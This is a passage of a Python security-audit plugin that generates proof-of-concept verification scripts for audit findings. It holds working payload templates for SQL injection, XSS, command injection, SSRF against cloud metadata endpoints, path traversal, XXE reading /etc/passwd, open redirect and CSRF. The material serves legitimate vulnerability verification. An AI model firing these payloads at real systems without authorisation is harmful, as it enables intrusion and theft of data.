#!/usr/bin/env python3
"""
POC 验证脚本生成器：根据审计发现生成可执行的 POC 验证脚本

子命令：
  generate   读取审计结果，为每个漏洞生成 POC 验证代码，输出 poc-scripts.py 和 poc-manifest.json
  run        执行 POC 验证脚本，对目标服务发送实际请求并收集验证结果

设计原则：
  - 生成的 POC 脚本是独立可执行的 Python 文件，不依赖插件运行环境
  - 支持用户配置目标服务地址、凭据等参数
  - 每个漏洞类型有对应的 POC 模板（SQL注入、XSS、SSRF、命令注入等）
  - POC 脚本仅发送探测性请求，不执行破坏性操作
  - 完整结果写入文件，stdout 仅输出 JSON 摘要供编排器解析
  - 日志信息输出到 stderr
"""
import argparse
import json
import os
import re
import sys
from datetime import datetime, timezone
from pathlib import Path
from textwrap import dedent, indent

from _common import (
    Colors, make_logger, stdout_json,
    load_json_file, write_json_file,
    normalize_finding, SEVERITY_ORDER,
)


log_info, log_ok, log_warn, log_error = make_logger('poc-gen')


# ---------------------------------------------------------------------------
# POC 模板注册表
# ---------------------------------------------------------------------------

# 每种漏洞类型对应的 POC 验证方法描述和脚本模板
# pocMethod: 人类可读的 POC 验证方式描述（会显示在报告中）
# template: Python 代码模板，占位符用 {var} 格式
# requestType: HTTP 请求类型描述

POC_TEMPLATES = {
    'sql-injection': {
        'pocMethod': 'HTTP 请求注入探测：向目标参数发送 SQL 探测 payload（时间盲注/布尔盲注），观察响应差异',
        'requestType': 'HTTP GET/POST',
        'template': dedent("""\
            def poc_sql_injection(base_url, path, param_name, method="GET", headers=None, cookies=None):
                \"\"\"SQL 注入 POC 验证
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                import time
                payloads = [
                    ("' OR '1'='1' --", "布尔盲注"),
                    ("' OR SLEEP(3) --", "时间盲注（MySQL）"),
                    ("'; WAITFOR DELAY '0:0:3' --", "时间盲注（MSSQL）"),
                    ("' AND 1=1 --", "布尔盲注-真"),
                    ("' AND 1=2 --", "布尔盲注-假"),
                ]
                results = []
                for payload, desc in payloads:
                    url = f"{{base_url}}{{path}}"
                    start = time.time()
                    try:
                        if method.upper() == "GET":
                            resp = session.get(url, params={{param_name: payload}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                        else:
                            resp = session.post(url, data={{param_name: payload}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                        elapsed = time.time() - start
                        results.append({{
                            "payload": payload, "type": desc,
                            "status_code": resp.status_code,
                            "elapsed_seconds": round(elapsed, 2),
                            "response_length": len(resp.text),
                            "suspicious": elapsed > 2.5 or "error" in resp.text.lower() or "sql" in resp.text.lower(),
                        }})
                    except Exception as e:
                        results.append({{"payload": payload, "type": desc, "error": str(e)}})
                return {{"findingId": "{findingId}", "riskType": "sql-injection", "results": results}}
        """),
    },
    'xss': {
        'pocMethod': 'HTTP 请求 XSS 探测：向目标参数注入 XSS payload，检查响应中是否原样反射',
        'requestType': 'HTTP GET/POST',
        'template': dedent("""\
            def poc_xss(base_url, path, param_name, method="GET", headers=None, cookies=None):
                \"\"\"XSS 跨站脚本 POC 验证
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                marker = "XSS_POC_" + str(int(time.time()))
                payloads = [
                    (f"<script>alert('{marker}')</script>", "反射型 XSS"),
                    (f"<img src=x onerror=alert('{marker}')>", "事件触发 XSS"),
                    (f"javascript:alert('{marker}')", "伪协议 XSS"),
                    (f"'><script>alert('{marker}')</script>", "属性逃逸 XSS"),
                ]
                results = []
                for payload, desc in payloads:
                    url = f"{{base_url}}{{path}}"
                    try:
                        if method.upper() == "GET":
                            resp = session.get(url, params={{param_name: payload}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                        else:
                            resp = session.post(url, data={{param_name: payload}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                        reflected = marker in resp.text
                        results.append({{
                            "payload": payload, "type": desc,
                            "status_code": resp.status_code,
                            "reflected": reflected,
                            "suspicious": reflected,
                        }})
                    except Exception as e:
                        results.append({{"payload": payload, "type": desc, "error": str(e)}})
                return {{"findingId": "{findingId}", "riskType": "xss", "results": results}}
        """),
    },
    'command-injection': {
        'pocMethod': 'HTTP 请求命令注入探测：注入无害系统命令（id/whoami/echo），检查响应中是否包含命令输出',
        'requestType': 'HTTP GET/POST',
        'template': dedent("""\
            def poc_command_injection(base_url, path, param_name, method="GET", headers=None, cookies=None):
                \"\"\"命令注入 POC 验证
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                marker = "CMDI_POC_MARKER"
                payloads = [
                    (f"; echo {marker}", "分号拼接"),
                    (f"| echo {marker}", "管道拼接"),
                    (f"$(echo {marker})", "命令替换"),
                    (f"`echo {marker}`", "反引号替换"),
                    (f"\\n echo {marker}", "换行拼接"),
                ]
                results = []
                for payload, desc in payloads:
                    url = f"{{base_url}}{{path}}"
                    try:
                        if method.upper() == "GET":
                            resp = session.get(url, params={{param_name: payload}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                        else:
                            resp = session.post(url, data={{param_name: payload}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                        results.append({{
                            "payload": payload, "type": desc,
                            "status_code": resp.status_code,
                            "marker_found": marker in resp.text,
                            "suspicious": marker in resp.text,
                        }})
                    except Exception as e:
                        results.append({{"payload": payload, "type": desc, "error": str(e)}})
                return {{"findingId": "{findingId}", "riskType": "command-injection", "results": results}}
        """),
    },
    'ssrf': {
        'pocMethod': 'HTTP 请求 SSRF 探测：注入内网地址/云元数据地址，观察响应差异或带外回调',
        'requestType': 'HTTP GET/POST',
        'template': dedent("""\
            def poc_ssrf(base_url, path, param_name, method="GET", headers=None, cookies=None, callback_url=None):
                \"\"\"SSRF 服务端请求伪造 POC 验证
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                payloads = [
                    ("http://127.0.0.1/", "本地回环"),
                    ("http://169.254.169.254/latest/meta-data/", "AWS IMDS"),
                    ("http://metadata.google.internal/computeMetadata/v1/", "GCP 元数据"),
                    ("http://[::1]/", "IPv6 回环"),
                    ("file:///etc/passwd", "本地文件读取"),
                ]
                if callback_url:
                    payloads.append((callback_url, "带外回调（OOB）"))
                results = []
                vulnerable = False
                for payload, desc in payloads:
                    url = f"{{base_url}}{{path}}"
                    try:
                        if method.upper() == "GET":
                            resp = session.get(url, params={{param_name: payload}}, headers=headers, cookies=cookies, timeout=10, verify=False, allow_redirects=False)
                        else:
                            # SSRF 通常是 POST JSON 格式
                            resp = session.post(url, json={{param_name: payload}}, headers=headers, cookies=cookies, timeout=10, verify=False, allow_redirects=False)
                        
                        # 判断漏洞是否存在：服务端成功发起了请求
                        # 只要返回 200 且有响应内容，说明 SSRF 请求成功执行
                        is_vulnerable = resp.status_code == 200 and len(resp.text) > 0
                        if is_vulnerable:
                            vulnerable = True
                        
                        results.append({{
                            "payload": payload, 
                            "type": desc,
                            "status_code": resp.status_code,
                            "response_length": len(resp.text),
                            "vulnerable": is_vulnerable,
                            "response_preview": resp.text[:200] if resp.text else "",
                        }})
                    except Exception as e:
                        results.append({{"payload": payload, "type": desc, "error": str(e), "vulnerable": False}})
                return {{"findingId": "{findingId}", "riskType": "ssrf", "vulnerable": vulnerable, "results": results}}
        """),
    },
    'path-traversal': {
        'pocMethod': 'HTTP 请求路径遍历探测：注入 ../ 序列尝试读取 /etc/passwd 或 win.ini 等已知文件',
        'requestType': 'HTTP GET/POST',
        'template': dedent("""\
            def poc_path_traversal(base_url, path, param_name, method="GET", headers=None, cookies=None):
                \"\"\"路径遍历 POC 验证
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                payloads = [
                    ("../../../etc/passwd", "Unix 路径遍历"),
                    ("..\\\\..\\\\..\\\\etc\\\\passwd", "反斜杠路径遍历"),
                    ("....//....//....//etc/passwd", "双写绕过"),
                    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL 编码"),
                    ("..%252f..%252f..%252fetc%252fpasswd", "双重编码"),
                ]
                results = []
                for payload, desc in payloads:
                    url = f"{{base_url}}{{path}}"
                    try:
                        if method.upper() == "GET":
                            resp = session.get(url, params={{param_name: payload}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                        else:
                            resp = session.post(url, data={{param_name: payload}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                        suspicious = "root:" in resp.text or "daemon:" in resp.text or "[fonts]" in resp.text
                        results.append({{
                            "payload": payload, "type": desc,
                            "status_code": resp.status_code,
                            "suspicious": suspicious,
                            "response_preview": resp.text[:200] if suspicious else "",
                        }})
                    except Exception as e:
                        results.append({{"payload": payload, "type": desc, "error": str(e)}})
                return {{"findingId": "{findingId}", "riskType": "path-traversal", "results": results}}
        """),
    },
    'idor': {
        'pocMethod': 'HTTP 请求越权探测：修改资源 ID 参数（递增/递减/替换），检查是否能访问其他用户资源',
        'requestType': 'HTTP GET/POST',
        'template': dedent("""\
            def poc_idor(base_url, path, param_name, method="GET", headers=None, cookies=None):
                \"\"\"IDOR 越权访问 POC 验证
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                test_ids = ["1", "2", "100", "999", "0", "-1", "admin"]
                results = []
                baseline_resp = None
                for test_id in test_ids:
                    url = f"{{base_url}}{{path}}"
                    try:
                        if method.upper() == "GET":
                            resp = session.get(url, params={{param_name: test_id}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                        else:
                            resp = session.post(url, data={{param_name: test_id}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                        if baseline_resp is None:
                            baseline_resp = resp
                        suspicious = (
                            resp.status_code == 200 and
                            len(resp.text) > 50 and
                            resp.text != baseline_resp.text
                        )
                        results.append({{
                            "test_id": test_id,
                            "status_code": resp.status_code,
                            "response_length": len(resp.text),
                            "different_from_baseline": resp.text != baseline_resp.text if baseline_resp else False,
                            "suspicious": suspicious,
                        }})
                    except Exception as e:
                        results.append({{"test_id": test_id, "error": str(e)}})
                return {{"findingId": "{findingId}", "riskType": "idor", "results": results}}
        """),
    },
    'open-redirect': {
        'pocMethod': 'HTTP 请求开放重定向探测：注入外部 URL，检查是否被重定向到攻击者控制的域名',
        'requestType': 'HTTP GET',
        'template': dedent("""\
            def poc_open_redirect(base_url, path, param_name, method="GET", headers=None, cookies=None):
                \"\"\"开放重定向 POC 验证
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                payloads = [
                    ("https://evil.com", "直接外部 URL"),
                    ("//evil.com", "协议相对 URL"),
                    ("/\\\\evil.com", "反斜杠绕过"),
                    ("https://evil.com%00.target.com", "空字节截断"),
                    ("https://target.com@evil.com", "@ 符号绕过"),
                ]
                results = []
                for payload, desc in payloads:
                    url = f"{{base_url}}{{path}}"
                    try:
                        resp = session.get(url, params={{param_name: payload}}, headers=headers, cookies=cookies, timeout=10, verify=False, allow_redirects=False)
                        location = resp.headers.get("Location", "")
                        suspicious = (
                            resp.status_code in (301, 302, 303, 307, 308) and
                            ("evil.com" in location)
                        )
                        results.append({{
                            "payload": payload, "type": desc,
                            "status_code": resp.status_code,
                            "location_header": location,
                            "suspicious": suspicious,
                        }})
                    except Exception as e:
                        results.append({{"payload": payload, "type": desc, "error": str(e)}})
                return {{"findingId": "{findingId}", "riskType": "open-redirect", "results": results}}
        """),
    },
    'xxe': {
        'pocMethod': 'HTTP 请求 XXE 探测：发送包含外部实体声明的 XML，检查是否解析并返回文件内容或发起外部请求',
        'requestType': 'HTTP POST (XML)',
        'template': dedent("""\
            def poc_xxe(base_url, path, headers=None, cookies=None, callback_url=None):
                \"\"\"XXE 外部实体注入 POC 验证
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                payloads = [
                    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>', "文件读取（/etc/hostname）"),
                    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "文件读取（/etc/passwd）"),
                ]
                if callback_url:
                    payloads.append((f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{{callback_url}}">]><root>&xxe;</root>', "带外 OOB"))
                xml_headers = dict(headers or {{}})
                xml_headers["Content-Type"] = "application/xml"
                results = []
                for payload, desc in payloads:
                    url = f"{{base_url}}{{path}}"
                    try:
                        resp = session.post(url, data=payload, headers=xml_headers, cookies=cookies, timeout=10, verify=False)
                        suspicious = "root:" in resp.text or resp.status_code == 200 and len(resp.text) > 10
                        results.append({{
                            "payload_type": desc,
                            "status_code": resp.status_code,
                            "response_length": len(resp.text),
                            "suspicious": suspicious,
                            "response_preview": resp.text[:200] if suspicious else "",
                        }})
                    except Exception as e:
                        results.append({{"payload_type": desc, "error": str(e)}})
                return {{"findingId": "{findingId}", "riskType": "xxe", "results": results}}
        """),
    },
    'csrf': {
        'pocMethod': 'HTTP 请求 CSRF 探测：不携带 CSRF token 发送跨站请求，检查服务端是否拒绝',
        'requestType': 'HTTP POST (无 CSRF token)',
        'template': dedent("""\
            def poc_csrf(base_url, path, form_data=None, headers=None, cookies=None):
                \"\"\"CSRF 跨站请求伪造 POC 验证
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                test_headers = dict(headers or {{}})
                # 模拟跨站请求：移除 Referer 和 Origin，不携带 CSRF token
                test_headers.pop("X-CSRF-Token", None)
                test_headers.pop("X-XSRF-Token", None)
                test_headers["Origin"] = "https://evil.com"
                test_headers["Referer"] = "https://evil.com/attack.html"
                url = f"{{base_url}}{{path}}"
                data = form_data or {{"test": "csrf_poc"}}
                results = []
                try:
                    resp = session.post(url, data=data, headers=test_headers, cookies=cookies, timeout=10, verify=False)
                    suspicious = resp.status_code in (200, 201, 204, 302)
                    results.append({{
                        "test": "无 CSRF token 跨域 POST",
                        "status_code": resp.status_code,
                        "suspicious": suspicious,
                        "note": "服务端接受了无 CSRF token 的跨域请求" if suspicious else "服务端拒绝了请求",
                    }})
                except Exception as e:
                    results.append({{"test": "无 CSRF token 跨域 POST", "error": str(e)}})
                return {{"findingId": "{findingId}", "riskType": "csrf", "results": results}}
        """),
    },
    'hardcoded-secret': {
        'pocMethod': '静态检测：硬编码密钥/凭证位于源代码中，无需发送请求即可确认。建议人工验证密钥是否仍然有效',
        'requestType': '无（静态发现）',
        'template': dedent("""\
            def poc_hardcoded_secret():
                \"\"\"硬编码密钥/凭证 POC（静态发现，无需网络请求）
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                return {{
                    "findingId": "{findingId}",
                    "riskType": "hardcoded-secret",
                    "results": [{{
                        "test": "静态检测",
                        "file": "{filePath}",
                        "line": {lineNumber},
                        "suspicious": True,
                        "note": "硬编码密钥/凭证存在于源代码中，建议人工验证其是否仍然有效并轮换",
                    }}],
                }}
        """),
    },
    'insecure-configuration': {
        'pocMethod': '配置检测：不安全的配置项存在于配置文件中。可通过 HTTP 请求验证配置是否生效',
        'requestType': 'HTTP GET（可选）',
        'template': dedent("""\
            def poc_insecure_configuration(base_url="/", headers=None, cookies=None):
                \"\"\"不安全配置 POC 验证
                目标: {filePath}:{lineNumber}
                风险描述: {description}
                \"\"\"
                results = [{{
                    "test": "静态配置检测",
                    "file": "{filePath}",
                    "line": {lineNumber},
                    "suspicious": True,
                    "note": "不安全配置项存在于配置文件中",
                }}]
                # 可选：验证安全头是否缺失
                if base_url and base_url != "/":
                    try:
                        resp = session.get(base_url, headers=headers, cookies=cookies, timeout=10, verify=False)
                        security_headers = {{
                            "X-Content-Type-Options": resp.headers.get("X-Content-Type-Options"),
                            "X-Frame-Options": resp.headers.get("X-Frame-Options"),
                            "Strict-Transport-Security": resp.headers.get("Strict-Transport-Security"),
                            "Content-Security-Policy": resp.headers.get("Content-Security-Policy"),
                        }}
                        missing = [k for k, v in security_headers.items() if not v]
                        results.append({{
                            "test": "安全响应头检测",
                            "missing_headers": missing,
                            "suspicious": len(missing) > 0,
                        }})
                    except Exception as e:
                        results.append({{"test": "安全响应头检测", "error": str(e)}})
                return {{"findingId": "{findingId}", "riskType": "insecure-configuration", "results": results}}
        """),
    },
}

# 通用 fallback 模板（未匹配到特定类型时使用）
GENERIC_POC_TEMPLATE = {
    'pocMethod': 'HTTP 请求探测：向目标端点发送构造的请求，观察响应行为',
    'requestType': 'HTTP GET/POST',
    'template': dedent("""\
        def poc_generic_{safe_id}(base_url, path="/", param_name="input", method="GET", headers=None, cookies=None):
            \"\"\"通用 POC 验证
            目标: {filePath}:{lineNumber}
            风险类型: {riskType}
            风险描述: {description}
            \"\"\"
            url = f"{{base_url}}{{path}}"
            results = []
            try:
                if method.upper() == "GET":
                    resp = session.get(url, params={{param_name: "poc_test"}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                else:
                    resp = session.post(url, data={{param_name: "poc_test"}}, headers=headers, cookies=cookies, timeout=10, verify=False)
                results.append({{
                    "test": "基础连通性",
                    "status_code": resp.status_code,
                    "response_length": len(resp.text),
                    "note": "请根据漏洞类型手动构造更精确的 payload",
                }})
            except Exception as e:
                results.append({{"test": "基础连通性", "error": str(e)}})
            return {{"findingId": "{findingId}", "riskType": "{riskType}", "results": results}}
    """),
}


# 风险类型 slug 归一化映射（支持常见变体）
_RISK_TYPE_TO_TEMPLATE_KEY = {
    'sql-injection': 'sql-injection',
    'sql_injection': 'sql-injection',
    'c1.1': 'sql-injection',
    'xss': 'xss',
    'cross-site-scripting': 'xss',
    'command-injection': 'command-injection',
    'cmd-injection': 'command-injection',
    'c1.2': 'command-injection',
    'ssrf': 'ssrf',
    'server-side-request-forgery': 'ssrf',
    'c1.3': 'ssrf',
    'c6.1': 'ssrf',
    'path-traversal': 'path-traversal',
    'directory-traversal': 'path-traversal',
    'c4.1': 'path-traversal',
    'idor': 'idor',
    'insecure-direct-object-reference': 'idor',
    'c7.3': 'idor',
    'open-redirect': 'open-redirect',
    'xxe': 'xxe',
    'xml-external-entity': 'xxe',
    'c6.2': 'xxe',
    'csrf': 'csrf',
    'cross-site-request-forgery': 'csrf',
    'csrf-disabled': 'csrf',
    'hardcoded-secret': 'hardcoded-secret',
    'hardcoded-credential': 'hardcoded-secret',
    'c5.1': 'hardcoded-secret',
    'insecure-configuration': 'insecure-configuration',
    'missing-security-headers': 'insecure-configuration',
    'insecure-cookie': 'insecure-configuration',
    'd2.4': 'insecure-configuration',
}


def _normalize_risk_type_slug(risk_type):
    """将 riskType 归一化为 POC 模板键"""
    if not risk_type:
        return 'unknown'
    slug = risk_type.lower().strip().replace(' ', '-').replace('_', '-')
    return _RISK_TYPE_TO_TEMPLATE_KEY.get(slug, slug)


def _safe_func_id(finding_id):
    """将 findingId 转为安全的 Python 函数名后缀"""
    return re.sub(r'[^a-zA-Z0-9]', '_', finding_id or 'unknown')


def _extract_endpoint_info(finding):
    """从 finding 的 attackChain 或显式字段中提取端点信息（path、method、param）"""
    endpoint_info = {
        'path': '',
        'method': 'GET',
        'param': '',
    }
    
    # 优先使用显式字段
    if finding.get('EndpointPath'):
        endpoint_info['path'] = finding.get('EndpointPath', '')
    if finding.get('EndpointMethod'):
        endpoint_info['method'] = finding.get('EndpointMethod', 'GET').upper()
    if finding.get('EndpointParam'):
        endpoint_info['param'] = finding.get('EndpointParam', '')
    
    # 如果有显式字段，直接返回
    if endpoint_info['path']:
        return endpoint_info

    chain = finding.get('attackChain')

    if isinstance(chain, dict):
        source = chain.get('source', '')
        source_str = json.dumps(source, ensure_ascii=False) if isinstance(source, dict) else str(source)

        # 尝试提取 HTTP 路径
        path_match = re.search(r'["\']?((?:/[\w\-./{}:]+)+)["\']?', source_str)
        if path_match:
            endpoint_info['path'] = path_match.group(1)

        # 尝试提取 HTTP 方法
        method_match = re.search(r'\b(GET|POST|PUT|DELETE|PATCH)\b', source_str, re.IGNORECASE)
        if method_match:
            endpoint_info['method'] = method_match.group(1).upper()

        # 尝试提取参数名
        param_patterns = [
            r'getParameter\(["\'](\w+)',
            r'req\.(body|query|params)\.(\w+)',
            r'request\.(form|args|json)\[?["\'](\w+)',
            r'@RequestParam.*?["\'](\w+)',
            r'@PathVariable.*?["\'](\w+)',
            r'c\.(Param|Query|PostForm)\(["\'](\w+)',
            r'r\.FormValue\(["\'](\w+)',
        ]
        for pat in param_patterns:
            m = re.search(pat, source_str, re.IGNORECASE)
            if m:
                endpoint_info['param'] = m.group(m.lastindex)
                break

    # Fallback: 从描述或代码片段推断
    if not endpoint_info['param']:
        desc = finding.get('description', '') + ' ' + finding.get('codeSnippet', '')
        param_match = re.search(r'(?:参数|parameter|param|input)[:\s]*["\']?(\w+)', desc, re.IGNORECASE)
        if param_match:
            endpoint_info['param'] = param_match.group(1)

    return endpoint_info


# ---------------------------------------------------------------------------
# POC 清单（manifest）生成
# ---------------------------------------------------------------------------

def build_poc_manifest(findings):
    """为每个 finding 生成 POC 验证清单条目。

    Returns:
        list of poc_entry dicts，每项包含：
        - findingId, filePath, lineNumber, riskType, severity
        - pocMethod: 验证方式描述
        - pocRequestType: 请求类型
        - pocFunctionName: 生成的 Python 函数名
        - endpointInfo: 提取的端点信息
        - templateKey: 使用的模板键
    """
    manifest = []
    func_counter = {}

    for f in findings:
        f = normalize_finding(f)
        risk_type = f.get('riskType', '')
        template_key = _normalize_risk_type_slug(risk_type)
        template_info = POC_TEMPLATES.get(template_key)

        if template_info:
            poc_method = template_info['pocMethod']
            request_type = template_info['requestType']
            func_base = f"poc_{template_key.replace('-', '_')}"
        else:
            poc_method = GENERIC_POC_TEMPLATE['pocMethod']
            request_type = GENERIC_POC_TEMPLATE['requestType']
            func_base = f"poc_generic_{_safe_func_id(f.get('findingId', ''))}"

        # 确保函数名唯一
        count = func_counter.get(func_base, 0)
        func_counter[func_base] = count + 1
        func_name = f"{func_base}_{count}" if count > 0 else func_base

        endpoint_info = _extract_endpoint_info(f)

        entry = {
            'findingId': f.get('findingId', ''),
            'filePath': f.get('filePath', ''),
            'lineNumber': f.get('lineNumber', 0),
            'riskType': risk_type,
            'severity': f.get('severity', 'medium'),
            'description': (f.get('description', '') or '')[:200],
            'pocMethod': poc_method,
            'pocRequestType': request_type,
            'pocFunctionName': func_name,
            'endpointInfo': endpoint_info,
            'templateKey': template_key if template_info else 'generic',
        }
        manifest.append(entry)

    return manifest


# ---------------------------------------------------------------------------
# POC 脚本文件生成
# ---------------------------------------------------------------------------

_SCRIPT_HEADER = dedent("""\
    #!/usr/bin/env python3
    \"\"\"
    POC 验证脚本 — 自动生成
    ============================================================
    本脚本由 security-scan 插件的 poc_generator.py 自动生成。
    每个函数对应一个发现的安全漏洞的验证逻辑。

    使用方法:
      1. 配置目标服务地址:
         python3 poc-scripts.py --base-url http://your-target:8080

      2. 配置认证凭据（如需要）:
         python3 poc-scripts.py --base-url http://your-target:8080 \\
           --cookie "session=abc123" \\
           --header "Authorization: Bearer <token>"

      3. 仅运行指定 finding 的 POC:
         python3 poc-scripts.py --base-url http://your-target:8080 --finding f-001

      4. 输出验证结果到 JSON 文件:
         python3 poc-scripts.py --base-url http://your-target:8080 --output poc-results.json

    注意事项:
      - 本脚本仅发送探测性请求，不执行破坏性操作
      - 请确保你有权对目标服务进行安全测试
      - 建议在测试环境而非生产环境中运行
      - 部分 POC 可能触发 WAF/IDS 告警

    生成时间: {generated_at}
    审计批次: {batch_id}
    漏洞总数: {total_findings}
    ============================================================
    \"\"\"
    import argparse
    import json
    import sys
    import time
    import urllib3

    # 禁用 SSL 警告（测试环境常见自签名证书）
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    try:
        import requests
    except ImportError:
        print("错误: 需要 requests 库。请运行: pip install requests", file=sys.stderr)
        sys.exit(1)

    # 全局会话
    session = requests.Session()


""")

_SCRIPT_RUNNER = dedent("""\

    # ===========================================================================
    # POC 运行器
    # ===========================================================================

    POC_REGISTRY = {poc_registry}


    def run_all_pocs(base_url, finding_filter=None, headers=None, cookies=None, callback_url=None):
        \"\"\"运行所有（或指定的）POC 验证函数\"\"\"
        results = []
        total = 0
        vulnerable_count = 0

        for entry in POC_REGISTRY:
            fid = entry["findingId"]
            if finding_filter and fid not in finding_filter:
                continue

            func_name = entry["funcName"]
            risk_type = entry["riskType"]
            template_key = entry["templateKey"]
            endpoint = entry.get("endpoint", {{}})

            func = globals().get(func_name)
            if not func:
                results.append({{"findingId": fid, "error": f"函数 {{func_name}} 未找到"}})
                continue

            total += 1
            path = endpoint.get("path", "/")
            param = endpoint.get("param", "input")
            method = endpoint.get("method", "GET")

            print(f"\\n[{{total}}] 验证 {{fid}} ({{risk_type}}): {{func_name}}", file=sys.stderr)
            try:
                # 根据模板类型调用不同参数签名
                if template_key in ("hardcoded-secret",):
                    result = func()
                elif template_key in ("xxe",):
                    result = func(base_url, path, headers=headers, cookies=cookies, callback_url=callback_url)
                elif template_key in ("csrf",):
                    result = func(base_url, path, headers=headers, cookies=cookies)
                elif template_key in ("insecure-configuration",):
                    result = func(base_url, headers=headers, cookies=cookies)
                elif template_key in ("ssrf",):
                    result = func(base_url, path, param, method, headers=headers, cookies=cookies, callback_url=callback_url)
                else:
                    result = func(base_url, path, param, method, headers=headers, cookies=cookies)
            except Exception as e:
                result = {{"findingId": fid, "error": str(e)}}

            # 统计漏洞存在数量
            if isinstance(result, dict):
                # 检查顶层 vulnerable 字段（SSRF 等模板使用）
                if result.get("vulnerable"):
                    vulnerable_count += 1
                # 检查 results 数组中的 vulnerable 字段（其他模板使用）
                elif "vulnerable" not in result:
                    for r in result.get("results", []):
                        if r.get("vulnerable") or r.get("suspicious"):
                            vulnerable_count += 1
                            break

            results.append(result)

        return {{
            "generatedAt": time.strftime("%Y-%m-%d %H:%M:%S"),
            "baseUrl": base_url,
            "totalTested": total,
            "vulnerableCount": vulnerable_count,
            "results": results,
        }}


    def main():
        parser = argparse.ArgumentParser(
            description="POC 验证脚本 — 对审计发现的漏洞发送实际验证请求",
            formatter_class=argparse.RawDescriptionHelpFormatter,
        )
        parser.add_argument("--base-url", required=True,
                           help="目标服务基础 URL（如 http://localhost:8080）")
        parser.add_argument("--finding", action="append", default=None,
                           help="仅验证指定的 findingId（可多次指定）")
        parser.add_argument("--cookie", default=None,
                           help="Cookie 字符串（如 'session=abc123; token=xyz'）")
        parser.add_argument("--header", action="append", default=None,
                           help="自定义请求头（如 'Authorization: Bearer xxx'，可多次指定）")
        parser.add_argument("--callback-url", default=None,
                           help="带外回调 URL（用于 SSRF/XXE 的 OOB 探测）")
        parser.add_argument("--output", "-o", default=None,
                           help="输出验证结果到 JSON 文件（默认输出到 stdout）")
        parser.add_argument("--quiet", action="store_true",
                           help="静默模式（仅输出 JSON 结果）")

        args = parser.parse_args()

        # 配置请求头
        headers = {{}}
        if args.header:
            for h in args.header:
                if ":" in h:
                    key, value = h.split(":", 1)
                    headers[key.strip()] = value.strip()

        # 配置 Cookie
        cookies = {{}}
        if args.cookie:
            for part in args.cookie.split(";"):
                if "=" in part:
                    key, value = part.strip().split("=", 1)
                    cookies[key.strip()] = value.strip()

        # 配置全局 session
        session.headers.update(headers)
        session.cookies.update(cookies)

        if not args.quiet:
            print(f"\\n{'='*60}", file=sys.stderr)
            print(f"  POC 验证脚本", file=sys.stderr)
            print(f"  目标: {{args.base_url}}", file=sys.stderr)
            print(f"  待验证: {{len(POC_REGISTRY)}} 个漏洞", file=sys.stderr)
            print(f"{'='*60}\\n", file=sys.stderr)

        # 运行
        report = run_all_pocs(
            args.base_url,
            finding_filter=set(args.finding) if args.finding else None,
            headers=headers,
            cookies=cookies,
            callback_url=args.callback_url,
        )

        json_output = json.dumps(report, ensure_ascii=False, indent=2)

        if args.output:
            with open(args.output, "w", encoding="utf-8") as f:
                f.write(json_output)
            if not args.quiet:
                print(f"\\n验证结果已保存: {{args.output}}", file=sys.stderr)
        else:
            print(json_output)

        # 摘要
        if not args.quiet:
            print(f"\\n{'='*60}", file=sys.stderr)
            print(f"  验证完成", file=sys.stderr)
            print(f"  测试总数: {{report['totalTested']}}", file=sys.stderr)
            print(f"  漏洞存在: {{report['vulnerableCount']}}", file=sys.stderr)
            print(f"{'='*60}", file=sys.stderr)


    if __name__ == "__main__":
        main()
""")


def generate_poc_script(manifest, batch_id=''):
    """根据 POC 清单生成完整的可执行 POC 脚本文件内容。

    Args:
        manifest: build_poc_manifest 的输出
        batch_id: 审计批次 ID

    Returns:
        str: 完整的 Python 脚本内容
    """
    generated_at = datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')

    # 生成脚本头部
    header = _SCRIPT_HEADER.format(
        generated_at=generated_at,
        batch_id=batch_id or 'unknown',
        total_findings=len(manifest),
    )

    # 生成各 finding 的 POC 函数
    functions = []
    poc_registry = []

    for entry in manifest:
        template_key = entry['templateKey']
        finding_id = entry['findingId']
        func_name = entry['pocFunctionName']
        file_path = entry['filePath']
        line_number = entry['lineNumber']
        risk_type = entry['riskType']
        description = entry.get('description', '')
        endpoint = entry.get('endpointInfo', {})

        # 选择模板
        if template_key in POC_TEMPLATES:
            template = POC_TEMPLATES[template_key]['template']
        else:
            template = GENERIC_POC_TEMPLATE['template']

        # 替换占位符
        code = template.format(
            findingId=finding_id,
            filePath=file_path,
            lineNumber=line_number,
            riskType=risk_type,
            description=description.replace('"', '\\"').replace('\n', ' ')[:150],
            safe_id=_safe_func_id(finding_id),
        )

        # 如果函数名与模板默认名不同，进行替换
        default_func_name = f"poc_{template_key.replace('-', '_')}" if template_key in POC_TEMPLATES else f"poc_generic_{_safe_func_id(finding_id)}"
        if func_name != default_func_name:
            code = code.replace(f"def {default_func_name}(", f"def {func_name}(", 1)

        functions.append(code)

        # 注册表条目
        poc_registry.append({
            'findingId': finding_id,
            'funcName': func_name,
            'riskType': risk_type,
            'severity': entry['severity'],
